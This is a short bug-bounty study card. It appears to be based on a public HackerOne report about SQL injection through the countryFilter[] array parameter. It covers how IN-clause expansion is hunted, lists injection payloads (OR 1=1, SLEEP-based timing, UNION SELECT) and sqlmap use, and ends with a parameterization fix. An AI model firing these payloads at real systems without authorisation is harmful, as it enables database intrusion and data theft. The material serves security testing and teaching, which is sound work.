---
name: sqli-array-parameter
description: SQL injection in array/collection parameters (countryFilter[]=) — the []-suffix input that breaks naive parameterization. Teaches testing array/repeated params and IN-clause injection.
sources: hackerone_public
report_count: 1
---

# SQL Injection in Array Parameters (countryFilter[])

**Report**: Valve — "SQL Injection in report_xml.php through countryFilter[] parameter" (hackerone.com/reports/383127, critical, $25,000, SQL Injection).

## Why it matters (the new lesson)
Array parameters (`?countryFilter[]=x`) are expanded into `IN (...)` clauses. Frameworks sometimes build `IN` lists with string interpolation (or escape differently), so the array form is injectable where the scalar form is not. Test `param[]=` explicitly.

## How it works
```sql
-- scalar: WHERE country IN ('US')      (safe)
-- array:  WHERE country IN ('US','FR') (often hand-built)
```
Attacker: `countryFilter[]=x') OR 1=1 --` → manipulates the `IN` list.

## How to hunt for it
1. Find list/filter params (dropdowns, multi-select, `id=`, `filter=`).
2. Append `[]` and send arrays: `p[]=1&p[]=2`.
3. Inject: `p[]=1'),(`p[]=2'`, `p[]=1' OR '1'='1`.
4. Confirm with error/boolean/time, then sqlmap `--data 'p[]=x'`.

## Payloads
```
?countryFilter[]=x') OR 1=1 --
?countryFilter[]=x') AND SLEEP(5) --
?countryFilter[]=x') UNION SELECT 1,2,3--
?ids[]=1&ids[]=2'
```

## Fix
Parameterize each `IN` element (positional placeholders), don't string-build `IN` lists; validate array element types.
